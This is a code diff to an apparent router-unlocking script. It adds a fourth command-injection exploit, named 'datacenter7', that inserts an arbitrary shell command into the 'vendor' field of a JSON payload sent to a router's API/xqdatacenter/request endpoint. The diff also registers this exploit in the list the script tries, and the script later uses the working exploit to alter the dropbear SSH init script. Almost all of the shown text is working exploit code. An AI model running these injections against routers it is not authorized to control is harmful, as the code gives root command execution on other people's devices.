@@ -59,13 +59,28 @@ def exploit_3(cmd, api = 'API/xqsystem/set_mac_filter'):
             return res  # Ok
     return ''
 
+def exploit_4(cmd, api = 'API/xqdatacenter/request'):
+    ######
+    # vuln/exploit author: SaulGoodMan1 ?????
+    # reg_code: CVE-????????
+    # publication: https://xz.aliyun.com/news/91619
+    ######
+    if '\n' in cmd:
+        raise ValueError('Incorrect shell command format')
+    params = { 'payload': '{"api":7,"dev":"a","vendor":";' + cmd + ';#","type":"a"}' }
+    try:
+        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
+    except requests.exceptions.ReadTimeout:
+        res = ''
+    return res
+
 
 # set default value for iperf_test_thr
 gw.set_diag_iperf_test_thr(20)
 
 vuln_test_num = 82000011
 exec_cmd = None
-exp_list = [ exploit_2, exploit_1, exploit_3 ]
+exp_list = [ exploit_2, exploit_1, exploit_3, exploit_4 ]
 for idx, exp_func in enumerate(exp_list):
     exp_test_num = vuln_test_num + idx
     res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
@@ -81,7 +96,7 @@ for idx, exp_func in enumerate(exp_list):
 gw.set_diag_iperf_test_thr(20)
 
 if not exec_cmd:
-    raise ExploitNotWorked('Exploits "arn_switch/start_binding/set_mac_filter" not working!!!')
+    raise ExploitNotWorked('Exploits "arn_switch/start_binding/set_mac_filter/datacenter7" not working!!!')
 
 if exec_cmd == exploit_1:
     print('Exploit "arn_switch" detected!') 
@@ -91,6 +106,9 @@ if exec_cmd == exploit_2:
 
 if exec_cmd == exploit_3:
     print('Exploit "set_mac_filter" detected!') 
+
+if exec_cmd == exploit_4:
+    print('Exploit "datacenter7" detected!') 
 
 
 exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
